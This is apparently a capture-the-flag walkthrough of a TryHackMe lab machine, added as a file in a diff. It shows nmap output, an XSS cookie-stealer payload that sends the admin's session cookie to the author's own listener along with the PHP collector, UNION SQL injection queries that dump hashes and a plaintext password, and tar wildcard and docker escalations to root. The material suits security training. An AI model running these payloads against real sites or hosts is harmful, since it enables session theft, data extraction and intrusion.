@@ -1,0 +1,213 @@
+Guess I recommended you to try to this machine by yourself before looking at any kind of walkthrough as it covers a great method to get into the machine and I am sure that 
+you guys will manage to go through it.
+
+I myself was gonna look up for walkthrough as I was stuck for more than 2 hours then I got a little hint from Tryhackme discord channel and then you can go on.
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Nmap scan results:
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/marketplaceCTF# nmap -A -T4 10.10.114.169 
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-21 18:05 IST
+Nmap scan report for 10.10.114.169
+Host is up (0.18s latency).
+Not shown: 997 filtered ports
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 c8:3c:c5:62:65:eb:7f:5d:92:24:e9:3b:11:b5:23:b9 (RSA)
+|   256 06:b7:99:94:0b:09:14:39:e1:7f:bf:c7:5f:99:d3:9f (ECDSA)
+|_  256 0a:75:be:a2:60:c6:2b:8a:df:4f:45:71:61:ab:60:b7 (ED25519)
+80/tcp    open  http    nginx 1.19.2
+| http-robots.txt: 1 disallowed entry 
+|_/admin
+|_http-server-header: nginx/1.19.2
+|_http-title: The Marketplace
+32768/tcp open  http    Node.js (Express middleware)
+| http-robots.txt: 1 disallowed entry 
+|_/admin
+|_http-title: The Marketplace
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Adtran 424RG FTTH gateway (86%), Linux 2.6.32 (86%), Linux 3.10 (86%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+I did a nikto and dirb and was able to get admin page but it kinda required authentication.
+
+I did create a user and logged in and found something peculiar.
+
+I know there was something related to XSS and I searched for cookie stealer that can help me gain access as admin.
+
+So there was this vulnerability where I was able to get cookie for the admin using xss cookie stealer.
+
+I first setup a little php listener for catching the cookie session.
+
+<script>document.location="http://10.9.81.62:8000/stealer.php?cookie="+document.cookie;</script>
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Contents of stealer.php:
+
+<?php
+$cookies = $_GET['cookie'];
+$file =fopen("cookie.txt","a");
+fwrite($file,$cookies . "\n\n");
+
+?>
+
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+root@LAPTOP-U5913CMD:/# php -S 10.9.81.62:8000
+[Wed Oct 21 20:45:26 2020] PHP 7.4.9 Development Server (http://10.9.81.62:8000) started
+[Wed Oct 21 20:46:04 2020] 10.9.81.62:49194 Accepted
+[Wed Oct 21 20:46:04 2020] 10.9.81.62:49194 Closing
+[Wed Oct 21 20:51:45 2020] 10.10.163.201:48768 Accepted
+[Wed Oct 21 20:51:45 2020] 10.10.163.201:48768 [200]: GET /stealer.php?cookie=token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MDMyOTM3MDV9.j8ZPhs8xF_2uLm7RrEkpip9JRyU0eakJCxUAbciahGs
+[Wed Oct 21 20:51:45 2020] 10.10.163.201:48768 Closing
+
+
+So using that cookie we can edit using cookie editor and gain access as the admin of the website.
+
+http://10.10.163.201:32768/admin
+
+THM{c37a63895910e478f28669b048c348d5}
+
+http://10.10.163.201:32768/admin?user=2
+
+I fired up sqlmap but got nothing.So I tried manual SQL Injection.
+
+I knew there was something related to sql injection and now we can try injecting some malicious sql injection payloads.
+
+Lets do one of these.
+
+
+http://10.10.32.111/admin?user=2 union select 1,2,3,4--
+
+We can perform sql injection right here.
+
+I was able to get the users table using sqli.
+
+http://10.10.32.111/admin?user=5 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()--
+There were 3 tables:
+User: items,messages,users 
+
+http://10.10.32.111/admin?user=5 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name="users"--
+
+User: id,username,password,isAdministrator 
+
+http://10.10.32.111/admin?user=5 union select 1,group_concat(password),3,4 from users--
+
+System: $2b$10$83pRYaR/d4ZWJVEex.lxu.Xs1a/TNDBWIUmB4z.R0DT0MSGIGzsgW
+Michael:$2b$10$yaYKN53QQ6ZvPzHGAlmqiOwGt8DXLAO5u2844yUlvu2EXwQDGf/1q
+Jake:$2b$10$/DkSlJB4L85SCNhS.IxcfeNpEBn.VkyLvQ2Tk9p2SDsiVcCRb4ukG
+Pirate:(Me):$2b$10$cOdV.Zpb4oEAcWUrFo3GDeIWQJgbF.SxRuIQ3fh0.7FzCquE5aIcu
+ 
+
+I didnot get anything from these hashes.
+So then I looked out for items and found nothing.
+Then there was this messages table.
+
+http://10.10.197.187/admin?user=6%20union%20select%201,group_concat(column_name),3,4%20from%20information_schema.columns%20where%20table_name=%22messages%22--
+
+User id,is_read,message_content,user_from,user_to 
+
+http://10.10.197.187/admin?user=6%20union%20select%201,message_content,3,4%20from%20messages--
+User Hello! An automated system has detected your SSH password is too weak and needs to be changed. You have been generated a new temporary password. 
+Your new password is: @b_ENXkGYUCAv3zJ 
+
+I dont know who the password is for.
+
+http://10.10.197.187/admin?user=6%20union%20select%201,user_to,3,4%20from%20messages--
+
+User 3 - user 3 is jake.
+
+Now we can peacfully log in through ssh as jake.
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/marketplaceCTF# ssh jake@10.10.197.187
+The authenticity of host '10.10.197.187 (10.10.197.187)' can't be established.
+ECDSA key fingerprint is SHA256:nRz0NCvN/WNh5cE3/dccxy42AXrwcJInG2n8nBWtNtg.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.197.187' (ECDSA) to the list of known hosts.
+jake@10.10.197.187's password: 
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-112-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Wed Oct 21 17:18:58 UTC 2020
+
+  System load:                    0.08
+  Usage of /:                     87.1% of 14.70GB
+  Memory usage:                   29%
+  Swap usage:                     0%
+  Processes:                      96
+  Users logged in:                0
+  IP address for eth0:            10.10.197.187
+  IP address for docker0:         172.17.0.1
+  IP address for br-636b40a4e2d6: 172.18.0.1
+
+  => / is using 87.1% of 14.70GB
+
+
+20 packages can be updated.
+0 updates are security updates.
+
+
+jake@the-marketplace:~$ id
+uid=1000(jake) gid=1000(jake) groups=1000(jake)
+jake@the-marketplace:~$ 
+
+ 
+jake@the-marketplace:~$ sudo -l
+Matching Defaults entries for jake on the-marketplace:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User jake may run the following commands on the-marketplace:
+    (michael) NOPASSWD: /opt/backups/backup.sh
+jake@the-marketplace:~$ 
+
+
+We will go into the /opt/backups
+
+cat backup.sh
+#!/bin/bash
+echo "Backing up files...";
+tar cf /opt/backups/backup.tar *
+
+
+Here comes the wildcard so we can get the shell as michael.
+
+Follow me:
+
+echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash" > run.sh
+chmod +x run.sh
+touch /opt/backups/--checkpoint=1
+touch /opt/backups/--checkpoint-action=exec=sh run.sh
+
+sudo -u michael /opt/backups/backup.sh
+
+$ id
+uid=1002(michael) gid=1002(michael) groups=1002(michael),999(docker)
+
+As michael is a member of group docker so we can escalate our privileges to root using the following command:
+
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+
+I searched for the methods to escalate privileges and our gtfobins is always there for us.
+
+https://gtfobins.github.io/gtfobins/docker/#shell
+
+michael@the-marketplace:/home$ docker run -v /:/mnt --rm -it alpine chroot /mnt s
+# id
+uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
+# cd /root
+# ls
+root.txt
+# cat root.txt
+THM{d4f76179c80####################}
+
+
+Thank you .... Happy Hacking :)
+
+-Voker2311
+
